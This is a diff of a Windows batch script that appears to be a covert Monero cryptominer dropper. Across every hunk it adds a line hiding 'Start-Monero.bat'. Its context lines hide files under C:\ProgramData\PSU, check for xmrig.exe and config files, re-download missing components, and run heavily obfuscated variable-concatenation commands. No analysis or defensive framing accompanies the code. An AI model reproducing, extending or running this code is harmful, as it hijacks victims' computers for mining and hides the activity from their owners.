@@ -77,6 +77,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
+attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
 %aaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa% “%bbbbbbbbbbbbbbbbbbbb%%aaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% %bbbb%%aaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%”
 %aaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaa% %aaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaa%%aaaaaa% %aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaa%%aaaaaa%=%aaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aa%%aaa%%aaaaaaaaaaaaa%%aaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% /%bbbbbbb% %aa%%aaaaaaaaaaaaaaaaaaaaaaa%*
@@ -150,6 +151,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
+attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -316,6 +318,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
+attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -586,6 +589,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
+attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -1086,6 +1090,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
+attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -1548,6 +1553,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
+attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -1760,6 +1766,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
+attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -1918,6 +1925,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
+attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -2109,6 +2117,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
+attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -2260,6 +2269,7 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
+attrib +h +s +r "C:\ProgramData\PSU\Start-Monero.bat"
 goto start
 :execute
 if not exist "C:\ProgramData\PSU\xmrig.exe" goto download
